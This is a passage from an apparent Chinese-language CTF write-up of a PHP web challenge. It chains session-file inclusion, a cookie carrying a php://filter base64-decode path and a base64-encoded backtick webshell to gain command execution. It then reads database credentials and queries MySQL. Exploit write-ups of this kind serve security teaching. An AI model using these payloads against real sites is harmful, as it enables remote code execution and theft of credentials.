</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-10>10</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>if</span> ( <span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;pet&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($_POST[<span style=color:#e6db74>&#39;pet&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;email&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($_POST[<span style=color:#e6db74>&#39;email&#39;</span>]) )
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    $dir<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;./upload/&#39;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>md5</span>($salt<span style=color:#f92672>.</span>$_POST[<span style=color:#e6db74>&#39;email&#39;</span>])<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;/&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>give_pet</span>($dir,$_POST[<span style=color:#e6db74>&#39;pet&#39;</span>]);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>check_available_pet</span>($_POST[<span style=color:#e6db74>&#39;pet&#39;</span>]))
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $log_content<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;[&#39;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>date</span>(<span style=color:#e6db74>&#34;h:i:sa&#34;</span>)<span style=color:#f92672>.</span><span style=color:#e6db74>&#39; GMT+7] gave &#39;</span><span style=color:#f92672>.</span>$_POST[<span style=color:#e6db74>&#39;pet&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#39; to player &#39;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>search_name_by_mail</span>($conn,$_POST[<span style=color:#e6db74>&#39;email&#39;</span>]);
</span></span><span style=display:flex><span>        $_SESSION[<span style=color:#e6db74>&#39;action&#39;</span>]<span style=color:#f92672>=</span>$log_content;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>其中的<code>search_name_by_mail($conn,$_POST['email'])</code> 正是用户名，而这是可修改的。所以只要在<code>CHARACTER</code> 页面执行一次送宠物给某个用户的操作，Session文件中就会出现该用户的用户名。而如果用户名是PHP代码，就会被执行。</p><p>用户名修改有哪些限制？</p><p>首先是<code>文件包含</code> 小节提到的所有<code>GET</code> ，<code>POST</code> 参数都必须经过的黑名单过滤。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-5>5</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>bad_words</span>($value){	$too_bad<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/(fuck|bakayaro|ditme|bitch|caonima|idiot|bobo|tanga|pin|gago|tangina|\/\/|damn|noob|pro|nishigou|stupid|ass|\(.+\)|`.+`|vcl|cyka|dcm)/is&#34;</span>;
</span></span><span style=display:flex><span>	$value <span style=color:#f92672>=</span> <span style=color:#a6e22e>preg_replace</span>($too_bad, <span style=color:#a6e22e>str_repeat</span>(<span style=color:#e6db74>&#34;*&#34;</span>,<span style=color:#ae81ff>3</span>) ,$value);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> $value;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e># |\/\/|\(.+\)|`.+`| 比较重要，意味着伪协议、函数、shell都不能直接使用。
</span></span></span></code></pre></td></tr></table></div></div><p>然后是<code>setting.php</code> （代码见<code>CPA猜解salt</code> 小节）中要求的不大于22个字符。</p><h2 id=characterphp>character.php<a hidden class=anchor aria-hidden=true href=#characterphp>#</a></h2><p>所有功能中唯一一个直接写文件的操作在和<code>CHARACTER</code> 页面，同样需经过黑名单过滤，并且要求小于20个字符。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-18>18</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;command&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($_POST[<span style=color:#e6db74>&#39;command&#39;</span>]))
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>strlen</span>($_POST[<span style=color:#e6db74>&#39;command&#39;</span>])<span style=color:#f92672>&gt;=</span><span style=color:#ae81ff>20</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;&lt;center&gt;&lt;strong&gt;Too Long&lt;/strong&gt;&lt;/center&gt;&#39;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>save_command</span>($mail,$salt,$_POST[<span style=color:#e6db74>&#39;command&#39;</span>]);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Refresh:0&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>/*
</span></span></span><span style=display:flex><span><span style=color:#75715e>function save_command($email,$salt,$data){
</span></span></span><span style=display:flex><span><span style=color:#75715e>	$dir=&#39;./upload/&#39;.md5($salt.$email);
</span></span></span><span style=display:flex><span><span style=color:#75715e>	file_put_contents($dir.&#39;/command.txt&#39;, $data);
</span></span></span><span style=display:flex><span><span style=color:#75715e>}
</span></span></span><span style=display:flex><span><span style=color:#75715e>*/</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=利用-1>利用<a hidden class=anchor aria-hidden=true href=#利用-1>#</a></h2><h3 id=思路>思路<a hidden class=anchor aria-hidden=true href=#思路>#</a></h3><p>全局共有两处可以修改文件，可以修改用户名以修改Session文件，也可在<code>CHARACTER</code> 页面修改<code>command.txt</code> ，但两处都是由<code>GET</code> 或<code>POST</code> 传的参，参数被黑名单过滤导致无法直接发挥作用。</p><p>考虑到COOKIE没有被过滤，可以用作跳板，在Session文件中包含Cookie，在<code>command.txt</code> 写入编码后的无害字符串，在Cookie写入利用伪协议读取 <code>command.txt</code> 并解码的语句，就成功向Session文件写入了一句话。</p><p>其实从哪个文件经由哪个变量跳到哪个文件是有多种可能的，但本题受限于长度这很可能是唯一的解法。</p><h3 id=步骤>步骤<a hidden class=anchor aria-hidden=true href=#步骤>#</a></h3><ul><li>在SETTING处修改用户名为<code>&lt;?=include"$_COOKIE[a]</code></li><li>在Fiddler的Filters处的Cookie后面添加上一条<code>a=php://filter/convert.base64-decode/resource=upload/ac8d37347a056bad2a852e4ef40de28a/command.txt</code></li><li>在character处给宠物发一条命令 <code>PD89YCRfR0VUW2ZdYDs</code> 从而写入<code>command.txt</code></li></ul><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># PD89YCRfR0VUW2ZdYDs 可解码为 &lt;?=`$_GET[f]`;</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=152b614a436e6ea63.png alt></p><ul><li>在admin处给自己送一只宠物</li></ul><p><img loading=lazy src=d698e40c760812e42.png alt></p><p>使执行语句</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$log_content<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;[&#39;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>date</span>(<span style=color:#e6db74>&#34;h:i:sa&#34;</span>)<span style=color:#f92672>.</span><span style=color:#e6db74>&#39; GMT+7] gave &#39;</span><span style=color:#f92672>.</span>$_POST[<span style=color:#e6db74>&#39;pet&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#39; to player &#39;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>search_name_by_mail</span>($conn,$_POST[<span style=color:#e6db74>&#39;email&#39;</span>]);
</span></span></code></pre></td></tr></table></div></div><p>而其中的<code>search_name_by_mail($conn,$_POST['email']</code> 正是用户名<code>&lt;?=include"$_COOKIE[a]</code></p><p>所以包含session文件就可以把Cookie里的变量a 包含进来，而a又是command.txt解码后的结果，也就是一句话木马。这时就可以以f为密码传入任意命令了。</p><ul><li>读到数据库配置文件</li></ul><p><img loading=lazy src=afd7c831d0103b1b3.png alt></p><ul><li>读到配置文件dbconnect.php</li></ul><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-7>7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-8>8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-9>9</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>define</span>(<span style=color:#e6db74>&#39;DBHOST&#39;</span>, <span style=color:#e6db74>&#39;localhost&#39;</span>);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>define</span>(<span style=color:#e6db74>&#39;DBUSER&#39;</span>, <span style=color:#e6db74>&#39;mapl_story_user&#39;</span>);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>define</span>(<span style=color:#e6db74>&#39;DBPASS&#39;</span>, <span style=color:#e6db74>&#39;tsu_tsu_tsu_tsu&#39;</span>); 
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>define</span>(<span style=color:#e6db74>&#39;DBNAME&#39;</span>, <span style=color:#e6db74>&#39;mapl_story&#39;</span>);
</span></span><span style=display:flex><span>	$conn <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysqli_connect</span>(<span style=color:#a6e22e>DBHOST</span>,<span style=color:#a6e22e>DBUSER</span>,<span style=color:#a6e22e>DBPASS</span>,<span style=color:#a6e22e>DBNAME</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span>$conn ) {
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Connection failed : &#34;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>mysql_error</span>());
</span></span><span style=display:flex><span>	}
</span></span></code></pre></td></tr></table></div></div><ul><li>然后执行命令</li></ul><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-mysql data-lang=mysql><span style=display:flex><span>echo <span style=color:#e6db74>&#39;SELECT * FROM mapl_config;&#39;</span><span style=color:#f92672>|</span> mysql <span style=color:#f92672>-</span>umapl_story_user <span style=color:#f92672>-</span>ptsu_tsu_tsu_tsu mapl_story
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>或</span>
</span></span><span style=display:flex><span>mysql <span style=color:#f92672>-</span>e<span style=color:#e6db74>&#39;select * from mapl_config&#39;</span> <span style=color:#f92672>-</span>umapl_story_user <span style=color:#f92672>-</span>ptsu_tsu_tsu_tsu mapl_story
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=7f86b5006e7779d8b.png alt></p><h3 id=脚本>脚本<a hidden class=anchor aria-hidden=true href=#脚本>#</a></h3><p>也可参考脚本理清利用过程：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-36>36</a>
